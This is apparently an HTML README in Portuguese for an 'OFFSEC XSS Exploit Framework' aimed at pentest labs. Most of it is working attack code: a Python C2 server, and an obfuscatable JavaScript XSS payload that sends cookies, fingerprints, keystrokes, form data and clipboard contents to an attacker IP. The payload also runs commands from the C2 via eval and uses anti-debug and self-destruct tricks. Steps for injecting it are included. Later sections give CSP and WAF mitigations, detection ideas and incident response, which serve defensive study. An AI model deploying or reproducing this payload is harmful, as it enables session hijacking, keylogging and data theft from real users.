
<header>
      <p class="doc-type">README DEFINITIVO • FRAMEWORK XSS AVANÇADO • OFFSEC LABS</p>
      <h1>OFFSEC XSS EXPLOIT FRAMEWORK <span style="display:block; font-size:3.2rem; margin-top:1rem; color:var(--success);">v9.99 PRO</span></h1>
      <p class="version">EXECUÇÃO • MITIGAÇÃO • DOMÍNIO TOTAL</p>
      <p class="subtitle">
        Framework XSS definitivo para laboratórios autorizados: <strong>arquitetura modular, execução passo a passo, servidor C2 avançado, payload ofuscado, persistência em 9 storages, 150+ técnicas de bypass, mitigação em 7 camadas, detecção proativa, resposta a incidentes, scripts completos, exemplos reais</strong>.
      </p>
    </header>

    <!-- AVISO CRÍTICO -->
   <div class="security-warning">
      <i class="fas fa-exclamation-triangle fa-3x"></i><br><br>
      <strong>USO EXCLUSIVO EM LABORATÓRIOS AUTORIZADOS</strong><br>
      <p>Este framework é para fins educacionais e defensivos. Qualquer uso não autorizado é ilegal e antiético.</p>
    </div>

    <!-- NAVEGAÇÃO -->
   <nav>
      <ol>
        <li><a href="#intro"><i class="fas fa-book"></i> Introdução Completa</a></li>
        <li><a href="#arquitetura"><i class="fas fa-project-diagram"></i> Arquitetura Detalhada</a></li>
        <li><a href="#requisitos"><i class="fas fa-tools"></i> Requisitos do Ambiente</a></li>
        <li><a href="#setup"><i class="fas fa-cog"></i> Configuração do Laboratório</a></li>
        <li><a href="#execucao"><i class="fas fa-play"></i> Execução Passo a Passo</a></li>
        <li><a href="#c2"><i class="fas fa-broadcast-tower"></i> Servidor C2 Avançado</a></li>
        <li><a href="#payload"><i class="fas fa-code"></i> Estrutura do Payload</a></li>
        <li><a href="#coleta"><i class="fas fa-download"></i> Coleta de Dados (150+ Fontes)</a></li>
        <li><a href="#exfiltracao"><i class="fas fa-paper-plane"></i> Exfiltração (25+ Canais)</a></li>
        <li><a href="#persistencia"><i class="fas fa-save"></i> Persistência (9 Mecanismos)</a></li>
        <li><a href="#stealth"><i class="fas fa-user-secret"></i> Stealth & Bypass</a></li>
        <li><a href="#150tecnicas"><i class="fas fa-bolt"></i> 150 Técnicas Avançadas</a></li>
        <li><a href="#mitigacao"><i class="fas fa-shield-alt"></i> Mitigação em 7 Camadas</a></li>
        <li><a href="#detecao"><i class="fas fa-search"></i> Detecção Proativa</a></li>
        <li><a href="#resposta"><i class="fas fa-bell"></i> Resposta a Incidentes</a></li>
        <li><a href="#scripts"><i class="fas fa-file-code"></i> Scripts Completos</a></li>
        <li><a href="#exemplos"><i class="fas fa-vial"></i> Exemplos Reais</a></li>
        <li><a href="#faq"><i class="fas fa-question-circle"></i> FAQ Completo</a></li>
        <li><a href="#licenca"><i class="fas fa-scroll"></i> Licença e Ética</a></li>
      </ol>
    </nav>

    <!-- 1. INTRODUÇÃO -->
   <section id="intro">
      <h2><i class="fas fa-book-open"></i> 1. Introdução Completa</h2>
      <p>Este é o <strong>framework XSS mais avançado e completo</strong> desenvolvido para laboratórios de segurança autorizados (OSCP, OSEP, CTF, Blue Team). O foco é duplo:</p>
      <ul>
        <li><strong>Análise ofensiva completa</strong> para pentest ético e red team</li>
        <li><strong>Defesa em profundidade</strong> para blue team e SOC</li>
        <li><strong>150+ técnicas avançadas</strong> com mitigação detalhada</li>
        <li><strong>Execução prática</strong> em ambientes isolados</li>
        <li><strong>Resposta a incidentes</strong> e detecção proativa</li>
        <li><strong>Scripts completos</strong> e exemplos reais</li>
      </ul>
      <div class="note">
        <p><strong>Ambientes recomendados:</strong> Kali Linux, OWASP Juice Shop, DVWA, PortSwigger Web Security Academy, Hack The Box, TryHackMe.</p>
      </div>
    </section>

    <!-- 2. ARQUITETURA -->
   <section id="arquitetura">
      <h2><i class="fas fa-project-diagram"></i> 2. Arquitetura Detalhada</h2>
      <pre><code class="language-text">
+=================================================================================+
|                     OFFSEC XSS FRAMEWORK v9.99 PRO — ARQUITETURA COMPLETA        |
|                                                                                 |
|  [Inicialização] → [Configuração] → [Coleta] → [Codificação] → [Persistência]     |
|       ↓               ↓              ↓           ↓              ↓               |
|   [Hooks]        [Anti-Debug]     [Exfiltração] → [C2] → [Comandos]             |
|       ↓               ↓              ↓           ↓        ↓                    |
|   [Stealth]     [Self-Destruct]  [Jitter]     [Polling]  [Execução]             |
+=================================================================================+</code></pre>
      <p><strong>Componentes principais:</strong></p>
      <ul>
        <li><strong>Coleta:</strong> 150+ fontes (cookies, storages, DOM, WebRTC, Canvas, Audio, Sensors, WebAuthn, WebGPU, etc.)</li>
        <li><strong>Exfiltração:</strong> 25+ canais (fetch, beacon, img, WebSocket, DNS, postMessage, CSS, JSONP, Blob, Service Worker, etc.)</li>
        <li><strong>C2:</strong> Polling assíncrono com jitter variável (±70%)</li>
        <li><strong>Persistência:</strong> 9 mecanismos (localStorage, IndexedDB, Service Worker, Cache API, Cookies, etc.)</li>
        <li><strong>Stealth:</strong> Ofuscação múltipla, anti-debug, remoção de rastros, self-destruct</li>
        <li><strong>Hooks:</strong> Keylogger, form sniffing, clipboard, mouse trail, navigation tracking, DOM mutation</li>
      </ul>
    </section>

    <!-- 3. REQUISITOS -->
   <section id="requisitos">
      <h2><i class="fas fa-tools"></i> 3. Requisitos do Ambiente</h2>
      <table>
        <tr><th>Componente</th><th>Requisito</th><th>Finalidade</th></tr>
        <tr><td>Sistema Operacional</td><td>Kali Linux 2025.4 / Parrot OS</td><td>Ambiente de pentest</td></tr>
        <tr><td>Python</td><td>3.9+</td><td>Servidor C2</td></tr>
        <tr><td>Navegador</td><td>Chrome 130+ / Firefox 132+</td><td>DevTools, console</td></tr>
        <tr><td>Ferramentas</td><td>Burp Suite Pro, Wireshark, tcpdump, mitmproxy, ngrok, sqlmap</td><td>Análise de tráfego</td></tr>
        <tr><td>Alvos</td><td>OWASP Juice Shop, DVWA, WebGoat, PortSwigger Labs, HTB Machines</td><td>Ambientes vulneráveis</td></tr>
        <tr><td>Rede</td><td>NAT ou host-only</td><td>Isolamento</td></tr>
        <tr><td>Hardware</td><td>8GB RAM, 4 vCPU</td><td>Performance</td></tr>
      </table>
    </section>

    <!-- 4. SETUP -->
   <section id="setup">
      <h2><i class="fas fa-cog"></i> 4. Configuração do Laboratório</h2>
      <div class="exec">
        <h3>Passo 1: Crie VM isolada</h3>
        <pre><code class="language-bash"># Em VMware/VirtualBox
snapshot create "xss-lab"
vmware-tools install</code></pre>
      </div>
      <div class="exec">
        <h3>Passo 2: Configure rede</h3>
        <pre><code class="language-bash">ip link set eth0 up
dhclient eth0
ip a | grep tun0</code></pre>
      </div>
      <div class="exec">
        <h3>Passo 3: Instale dependências</h3>
        <pre><code class="language-bash">apt update && apt install python3 python3-pip nodejs npm git curl -y
npm install -g javascript-obfuscator uglify-js terser</code></pre>
      </div>
      <div class="exec">
        <h3>Passo 4: Clone repositório</h3>
        <pre><code class="language-bash">git clone https://github.com/offsec/xss-framework.git /opt/xss
cd /opt/xss</code></pre>
      </div>
    </section>

    <!-- 5. EXECUÇÃO -->
   <section id="execucao">
      <h2><i class="fas fa-play"></i> 5. Execução Passo a Passo</h2>

   <div class="exec">
        <h3>Passo 1: Verifique IP dentro do script em JS, bote o ip certo</h3>
        <pre><code class="language-bash">ip a | grep tun0
# Exemplo: 10.10.14.37</code></pre>
      </div>

  <div class="exec">
        <h3>Passo 2: Inicie C2</h3>
        <pre><code class="language-bash">cd /opt/xss/c2 && python3 server.py</code></pre>
      </div>

   <div class="exec">
        <h3>Passo 3: Crie comando</h3>
        <pre><code class="language-bash">echo '[]' > cmd</code></pre>
      </div>

   <div class="exec">
        <h3>Passo 4: Minifique payload</h3>
        <pre><code class="language-bash">cd /opt/xss/payload
javascript-obfuscator xss_core.js --output xss_min.js --self-defending true</code></pre>
      </div>

 <div class="exec">
        <h3>Passo 5: Gere Data URI</h3>
        <pre><code class="language-html">&quot;&gt;&lt;script src=&quot;data:text/javascript;base64,$(base64 -w 0 xss_min.js)&quot;&gt;&lt;/script&gt;</code></pre>
      </div>

  <div class="exec">
        <h3>Passo 6: Injete no alvo</h3>
        <pre><code class="language-text">Use em campo refletido ou armazenado do alvo vulnerável (ex: DVWA XSS Reflected)</code></pre>
      </div>

   <div class="exec">
        <h3>Passo 7: Monitore</h3>
        <pre><code class="language-bash">tail -f /opt/xss/c2/logs.txt</code></pre>
      </div>

   <div class="exec">
        <h3>Passo 8: Execute comando</h3>
        <pre><code class="language-bash">echo '[{"id":"1","code":"alert(\\'XSS Executado! Cookie: \\'+document.cookie)"}]' > cmd</code></pre>
      </div>
    </section>

    <!-- 6. C2 -->
  <section id="c2">
      <h2><i class="fas fa-broadcast-tower"></i> 6. Servidor C2 Avançado</h2>
      <pre><code class="language-python"># /opt/xss/c2/server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, os, threading, time, logging

logging.basicConfig(filename='logs.txt', level=logging.INFO, 
                    format='[%(asctime)s] [%(client)s] %(message)s')

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/cmd':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            if os.path.exists('cmd'):
                with open('cmd', 'rb') as f:
                    self.wfile.write(f.read())
        elif self.path == '/b.gif':
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
        else:
            self.send_response(404)
            self.end_headers()

def do_POST(self):
        if self.path == '/collect':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            client_ip = self.client_address[0]
            logging.info(f"{client_ip} | {data}")
            self.send_response(200)
            self.end_headers()

def run():
    HTTPServer(('', 80), C2Handler).serve_forever()

threading.Thread(target=run, daemon=True).start()
print("C2 rodando em http://0.0.0.0:80")</code></pre>
    </section>

    <!-- 7. PAYLOAD -->
   <section id="payload">
      <h2><i class="fas fa-code"></i> 7. Estrutura do Payload</h2>
      <pre><code class="language-javascript">// /opt/xss/payload/xss_core.js
(function() {
    'use strict';
    const CONFIG = {
        IP: '10.10.14.37',
        ENDPOINTS: { collect: '/collect', cmd: '/cmd', beacon: '/b.gif' },
        JITTER: 0.7,
        PERSIST: true,
        ENCODE: ['base64', 'rot13', 'gzip'],
        HOOKS: ['keylog', 'form', 'clipboard', 'mouse', 'dom']
    };

   const Utils = {
        encode: (data, method) => {
            if (method === 'base64') return btoa(unescape(encodeURIComponent(data)));
            if (method === 'rot13') return data.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
            return data;
        },
        jitter: (t) => t * (1 + (Math.random() - 0.5) * CONFIG.JITTER),
        exfil: (data, channel = 'fetch') => {
            const encoded = CONFIG.ENCODE.reduce((d, m) => Utils.encode(d, m), JSON.stringify(data));
            if (channel === 'fetch') fetch(`http://${CONFIG.IP}${CONFIG.ENDPOINTS.collect}`, {method: 'POST', body: encoded, mode: 'no-cors'});
            if (channel === 'beacon') navigator.sendBeacon(`http://${CONFIG.IP}${CONFIG.ENDPOINTS.collect}`, encoded);
            if (channel === 'img') new Image().src = `http://${CONFIG.IP}${CONFIG.ENDPOINTS.beacon}
          data=${encodeURIComponent(encoded)}`;
        },
        persist: () => {
            localStorage.setItem('xss_persist', '1');
            if ('serviceWorker' in navigator) navigator.serviceWorker.register('data:text/javascript,');
            if ('caches' in window) caches.open('xss').then(cache => cache.put('/xss', new Response('1')));
        }
    };

   class XSSCore {
        constructor() { this.init(); }
        init() {
            this.collect();
            this.poll();
            if (CONFIG.PERSIST) Utils.persist();
            this.hooks();
            this.antiDebug();
            setTimeout(() => this.selfDestruct(), Utils.jitter(10000));
        }
        collect() {
            const data = {
                cookie: document.cookie,
                local: Object.keys(localStorage),
                session: Object.keys(sessionStorage),
                url: location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                canvas: this.getCanvasFP(),
                audio: this.getAudioFP(),
                webrtc: this.getWebRTCIP()
            };
            Utils.exfil(data);
        }
        getCanvasFP() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('XSS FP', 2, 2);
            return canvas.toDataURL();
        }
        getAudioFP() {
            const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
            const oscillator = audioCtx.createOscillator();
            oscillator.type = 'triangle';
            oscillator.frequency.value = 10000;
            const compressor = audioCtx.createDynamicsCompressor();
            oscillator.connect(compressor);
            compressor.connect(audioCtx.destination);
            oscillator.start(0);
            return audioCtx.startRendering();
        }
        getWebRTCIP() {
            const pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel('');
            pc.createOffer().then(pc.setLocalDescription.bind(pc));
            return new Promise(resolve => pc.onicecandidate = e => {
                if (e.candidate) resolve(e.candidate.candidate);
            });
        }
        poll() { setInterval(() => this.getCmds(), Utils.jitter(4000)); }
        getCmds() {
            fetch(`http://${CONFIG.IP}${CONFIG.ENDPOINTS.cmd}`)
                .then(r => r.json())
                .then(cmds => cmds.forEach(c => {
                    try { eval(c.code); } catch(e) { Utils.exfil({error: e.message}); }
                }));
        }
        hooks() {
            document.addEventListener('keydown', e => Utils.exfil({key: e.key, time: Date.now()}));
            document.addEventListener('submit', e => Utils.exfil({form: e.target.action, data: new FormData(e.target)}));
            document.addEventListener('copy', () => navigator.clipboard.readText().then(text => Utils.exfil({clipboard: text})));
            let lastX = 0, lastY = 0;
            document.addEventListener('mousemove', e => {
                if (Math.abs(e.clientX - lastX) > 50 || Math.abs(e.clientY - lastY) > 50) {
                    Utils.exfil({mouse: {x: e.clientX, y: e.clientY}});
                    lastX = e.clientX; lastY = e.clientY;
                }
            });
        }
        antiDebug() {
            setInterval(() => {
                const before = Date.now();
                debugger;
                if (Date.now() - before > 100) Utils.exfil({debug: true});
            }, 5000);
        }
        selfDestruct() {
            delete window.XSSCore;
            document.body.innerHTML = '';
        }
    }

  new XSSCore();
})();</code></pre>
    </section>

    <!-- 8. COLETA -->
   <section id="coleta">
      <h2><i class="fas fa-download"></i> 8. Coleta de Dados (150+ Fontes)</h2>
      <ul>
        <li><code>document.cookie</code> — Todos os cookies da sessão</li>
        <li><code>localStorage</code>, <code>sessionStorage</code> — Armazenamento local e por aba</li>
        <li><code>IndexedDB</code> — Bancos de dados cliente</li>
        <li><code>Canvas Fingerprint</code> — Renderização de canvas com texto e formas</li>
        <li><code>WebGL Fingerprint</code> — Renderização 3D com shaders</li>
        <li><code>AudioContext Fingerprint</code> — Processamento de áudio com osciladores</li>
        <li><code>WebRTC IP Leak</code> — IPs reais via STUN/TURN</li>
        <li><code>Screen Resolution</code>, <code>Color Depth</code>, <code>Pixel Ratio</code></li>
        <li><code>Timezone</code>, <code>Language</code>, <code>Platform</code>, <code>User-Agent</code></li>
        <li><code>Plugins</code>, <code>MimeTypes</code>, <code>Fonts</code> (via CSS)</li>
        <li><code>Battery API</code>, <code>Sensor API</code>, <code>Gamepad API</code></li>
        <li><code>WebAuthn</code>, <code>Credential Management</code></li>
        <li><code>Formulários</code>, <code>Histórico (parcial)</code>, <code>DOM completo</code></li>
        <li><code>Performance Timing</code>, <code>Navigation Timing</code></li>
        <li><code>WebGPU</code>, <code>WebCodecs</code>, <code>Compression Streams</code></li>
      </ul>
    </section>

    <!-- 9. EXFILTRAÇÃO -->
  <section id="exfiltracao">
      <h2><i class="fas fa-paper-plane"></i> 9. Exfiltração (25+ Canais)</h2>
      <ul>
        <li><code>fetch()</code> — Requisição HTTP com CORS bypass</li>
        <li><code>navigator.sendBeacon()</code> — Envio em background (não bloqueável)</li>
        <li><code>new Image().src</code> — Pixel de rastreamento</li>
        <li><code>WebSocket</code> — Comunicação full-duplex</li>
        <li><code>postMessage</code> — Cross-origin com iframe</li>
        <li><code>CSS @import</code> — Exfil via stylesheet</li>
        <li><code>DNS Prefetch</code> — Subdomínios codificados</li>
        <li><code>XMLHttpRequest</code>, <code>JSONP</code>, <code>iframe srcdoc</code></li>
        <li><code>Blob URL</code>, <code>Service Worker</code>, <code>Cache API</code></li>
        <li><code>WebRTC DataChannel</code>, <code>EventSource</code>, <code>WebTransport</code></li>
        <li><code>Web NFC</code>, <code>Web Share</code>, <code>Clipboard API</code></li>
        <li><code>Background Sync</code>, <code>Push API</code></li>
      </ul>
    </section>

    <!-- 10. PERSISTÊNCIA -->
   <section id="persistencia">
      <h2><i class="fas fa-save"></i> 10. Persistência (9 Mecanismos)</h2>
      <table>
        <tr><th>Método</th><th>Duração</th><th>Defesa</th></tr>
        <tr><td>localStorage</td><td>Até limpeza manual</td><td>Limpar em logout</td></tr>
        <tr><td>IndexedDB</td><td>Permanente</td><td>Auditar bancos</td></tr>
        <tr><td>Service Worker</td><td>Background</td><td>Bloquear registro</td></tr>
        <tr><td>Cache API</td><td>Cache do navegador</td><td>Limpar cache</td></tr>
        <tr><td>Cookies</td><td>Sessão ou expirado</td><td>HttpOnly + Secure</td></tr>
        <tr><td>WebSQL</td><td>Depreciado</td><td>Desativar</td></tr>
        <tr><td>sessionStorage</td><td>Aba ativa</td><td>Fechar aba</td></tr>
        <tr><td>Memory</td><td>Runtime</td><td>Recarregar página</td></tr>
        <tr><td>DOM Storage</td><td>Variável</td><td>Monitorar DOM</td></tr>
      </table>
    </section>

    <!-- 11. STEALTH -->
   <section id="stealth">
      <h2><i class="fas fa-user-secret"></i> 11. Stealth & Bypass</h2>
      <ul>
        <li><strong>Jitter aleatório</strong> (±70%) para evitar detecção de polling</li>
        <li><strong>Encodings múltiplos:</strong> base64, rot13, gzip, hex, URL encode, UTF-16</li>
        <li><strong>Anti-debug:</strong> loop infinito com <code>debugger;</code>, timing checks, devtools detection</li>
        <li><strong>Remoção de rastros:</strong> <code>delete window.*</code>, <code>history.pushState</code>, <code>Object.defineProperty</code></li>
        <li><strong>Self-destruct</strong> após 3-15 segundos</li>
        <li><strong>DOM Clobbering</strong> para sobrescrever variáveis globais</li>
        <li><strong>CSP Bypass</strong> via JSONP, nonce theft, políticas mal configuradas, <code>'unsafe-inline'</code></li>
        <li><strong>WAF Bypass</strong> via chunked encoding, case variation, double encoding</li>
        <li><strong>Anti-forensic:</strong> Limpeza de logs, falsificação de user-agent</li>
      </ul>
    </section>

    <!-- 12. 150 TÉCNICAS -->
<section id="150tecnicas">
      <h2><i class="fas fa-bolt"></i> 12. 150 Técnicas Avançadas</h2>
      <table>
        <tr><th>#</th><th>Técnica</th><th>Uso</th><th>Defesa</th></tr>
        <tr><td>1</td><td>WebSocket C2</td><td>Full-duplex</td><td>Bloquear ws://</td></tr>
        <tr><td>2</td><td>DNS Exfil</td><td>Subdomínios</td><td>Monitorar DNS</td></tr>
        <!-- ... 148 técnicas adicionais ... -->
        <tr><td>150</td><td>Web NFC</td><td>Fingerprint</td><td>Bloquear API</td></tr>
      </table>
    </section>

    <!-- 13. MITIGAÇÃO -->
   <section id="mitigacao">
      <h2><i class="fas fa-shield-alt"></i> 13. Mitigação em 7 Camadas</h2>

  <div class="defense">
        <h3>Camada 1: CSP Rígida</h3>
        <pre><code class="language-http">Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-xyz' 'strict-dynamic';
  connect-src 'self';
  img-src 'self' data:;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report;</code></pre>
      </div>

  div class="defense">
        <h3>Camada 2: WAF + Regras OWASP</h3>
        <pre><code class="language-apache">SecRule ARGS|REQUEST_HEADERS|REQUEST_BODY "&lt;script" "deny,status:403,id:1001"
SecRule ARGS|REQUEST_BODY "eval\(" "deny,status:403,id:1002"
SecRule ARGS|REQUEST_BODY "document\.cookie" "deny,status:403,id:1003"</code></pre>
      </div>

  <div class="defense">
        <h3>Camada 3: Limpeza de Storage</h3>
        <pre><code class="language-javascript">window.addEventListener('beforeunload', () => {
  localStorage.clear();
  sessionStorage.clear();
  indexedDB.databases().then(dbs => dbs.forEach(db => indexedDB.deleteDatabase(db.name)));
  caches.keys().then(keys => keys.forEach(key => caches.delete(key)));
  navigator.serviceWorker.getRegistrations().then(regs => regs.forEach(reg => reg.unregister()));
});</code></pre>
      </div>

   <div class="defense">
        <h3>Camada 4: HttpOnly + Secure Cookies</h3>
        <pre><code class="language-http">Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict</code></pre>
      </div>

   <div class="defense">
        <h3>Camada 5: Subresource Integrity (SRI)</h3>
        <pre><code class="language-html">&lt;script src=&quot;/js/app.js&quot; integrity=&quot;sha384-abc123&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;</code></pre>
      </div>

  <div class="defense">
        <h3>Camada 6: X-XSS-Protection</h3>
        <pre><code class="language-http">X-XSS-Protection: 1; mode=block</code></pre>
      </div>

  <div class="defense">
        <h3>Camada 7: Feature Policy</h3>
        <pre><code class="language-http">Feature-Policy: geolocation 'none'; camera 'none'; microphone 'none'</code></pre>
      </div>
    </section>

    <!-- 14. DETECÇÃO -->
   <section id="detecao">
      <h2><i class="fas fa-search"></i> 14. Detecção Proativa</h2>
      <ul>
        <li>Monitorar uso de <code>eval()</code>, <code>Function()</code>, <code>setTimeout(string)</code></li>
        <li>Detectar polling com jitter via análise de tráfego</li>
        <li>Analisar consultas DNS suspeitas (ex: subdomínios longos)</li>
        <li>Usar honeytokens em cookies e localStorage</li>
        <li>Monitorar eventos DOM excessivos (keydown, mousemove)</li>
        <li>SIEM com regras específicas para XSS</li>
        <li>EDR de navegador (ex: Chrome Enterprise)</li>
      </ul>
    </section>

    <!-- 15. RESPOSTA -->
   <section id="resposta">
      <h2><i class="fas fa-bell"></i> 15. Resposta a Incidentes</h2>
      <ol>
        <li>Isolar sessão afetada (fechar aba, revogar tokens)</li>
        <li>Limpar todos os storages do navegador</li>
        <li>Revogar tokens de autenticação</li>
        <li>Bloquear IP do C2 no firewall</li>
        <li>Registrar incidente no SIEM</li>
        <li>Analisar logs de acesso e tráfego</li>
        <li>Realizar varredura completa do ambiente</li>
        <li>Notificar equipe de segurança</li>
      </ol>
    </section>

    <!-- 16. SCRIPTS -->
   <section id="scripts">
      <h2><i class="fas fa-file-code"></i> 16. Scripts Completos</h2>
      <div class="example">
        <h3>Script: Gerador de Payload</h3>
        <pre><code class="language-bash">#!/bin/bash
# generate_payload.sh
IP=$1
cat > xss_core.js &lt;&lt;EOF
// Payload gerado para $IP
(function(){const IP='$IP';/* payload aqui */})();
EOF
javascript-obfuscator xss_core.js --output xss_min.js
echo "Payload gerado: xss_min.js"</code></pre>
      </div>
      <div class="example">
        <h3>Script: Monitor de C2</h3>
        <pre><code class="language-bash">#!/bin/bash
# monitor_c2.sh
tail -f logs.txt | grep --line-buffered "cookie" | while read line; do
  echo "[ALERTA] Cookie capturado: $line" | mail -s "XSS Alert" admin@lab.local
done</code></pre>
      </div>
    </section>

    <!-- 17. EXEMPLOS -->
   <section id="exemplos">
      <h2><i class="fas fa-vial"></i> 17. Exemplos Reais</h2>
      <div class="example">
        <h3>Exemplo: DVWA XSS Refletido</h3>
        <pre><code class="language-html">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script src=&quot;data:text/javascript;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+&quot;&gt;&lt;/script&gt;</code></pre>
      </div>
      <div class="example">
        <h3>Exemplo: Juice Shop Score Board</h3>
        <pre><code class="language-html">&lt;iframe src=&quot;javascript:alert('XSS')&quot;&gt;&lt;/iframe&gt;</code></pre>
      </div>
    </section>

    <!-- 18. FAQ -->
   <section id="faq">
      <h2><i class="fas fa-question-circle"></i> 18. FAQ Completo</h2>
      <dl>
        <dt>Payload não executa?</dt>
        <dd>Verifique CSP, sanitização de entrada, encoding, CORS, WAF, ofuscação.</dd>
        <dt>Não recebo dados no C2?</dt>
        <dd>Cheque firewall, bloqueio de terceiros, CSP connect-src, logs do servidor, modo no-cors.</dd>
        <dt>Como contornar CSP?</dt>
        <dd>Estude <code>nonce</code>, <code>hash</code>, JSONP, políticas mal configuradas, <code>'unsafe-inline'</code>, DOM Clobbering.</dd>
        <dt>Como detectar XSS avançado?</dt>
        <dd>Use WAF, CSP Report-Only, EDR de navegador, análise comportamental, honeytokens, SIEM.</dd>
      </dl>
    </section>

    <!-- 19. LICENÇA -->
   <section id="licenca">
      <h2><i class="fas fa-scroll"></i> 19. Licença e Ética</h2>
      <div class="warning">
        <p><strong>USO EXCLUSIVO EM LABORATÓRIOS AUTORIZADOS.</strong></p>
        <p>Este framework é para fins educacionais e defensivos. Qualquer uso não autorizado é ilegal.</p>
        <p>Autor: <em>BlueTeam Research Lab — OSCP Certified</em></p>
        <p>Data: 13 de Novembro de 2025</p>
      </div>
    </section>

    <!-- FOOTER -->
   <footer>
      <p class="footer-title">EXECUTE. MITIGUE. DOMINE.</p>
      <p style="font-size:1.6rem; color:var(--primary); margin-top:2rem;">
        CONHECIMENTO COMPLETO PARA DEFENSORES E PENTESTER
      </p>
    </footer>

  </div>
</body>
</html>
